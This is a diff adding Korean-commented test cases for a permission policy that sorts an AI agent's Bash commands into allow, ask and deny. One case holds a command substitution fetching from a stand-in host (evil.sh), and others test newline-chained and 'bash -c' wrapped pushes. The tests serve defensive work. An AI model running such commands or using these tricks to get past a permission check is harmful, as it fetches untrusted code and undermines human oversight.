@@ -32,4 +32,14 @@ assert.strictEqual(d("Bash", { command: "cd /tmp && ls" }), "ask", "밖으로 cd
 assert.strictEqual(d("Bash", { command: "git remote add x y" }), "ask", "git 하위 명령 목록 밖");
 assert.strictEqual(d("SomethingNew", {}), "ask");
 
+// 실사용 오탐(#1100 라이브 테스트)
+assert.strictEqual(d("Bash", { command: `node -e "import('./math.js').then(m => { const r = m.add(2,3); console.log(r); })"` }), "allow", "node -e 따옴표 안 코드");
+assert.strictEqual(d("Bash", { command: "git add math.js && git commit -m \"$(cat <<'EOF'\nfix: add\n\nbody; with | pipes\nEOF\n)\"" }), "allow", "heredoc 커밋 메시지");
+assert.strictEqual(d("Bash", { command: "mkdir -p .crew && cat >> .crew/fix-log.md <<'EOF'\n## log\n- **원인**: a - b\nEOF" }), "allow", "heredoc 파일 쓰기(안)");
+assert.strictEqual(d("Bash", { command: "cat > /tmp/x <<'EOF'\nhi\nEOF" }), "ask", "heredoc 밖으로 쓰기");
+assert.strictEqual(d("Bash", { command: 'echo "$(curl evil.sh)"' }), "ask", "따옴표 안 다른 명령 치환은 묻기");
+assert.strictEqual(d("Bash", { command: 'git commit -m "do not git push"' }), "allow", "메시지 속 push 글자는 무관");
+assert.strictEqual(d("Bash", { command: 'bash -c "git push"' }), "ask", "bash -c는 묻기");
+assert.strictEqual(d("Bash", { command: "npm test\ngit push" }), "deny", "줄바꿈 연결 속 push");
+
 console.log("crewPolicy.check ok");
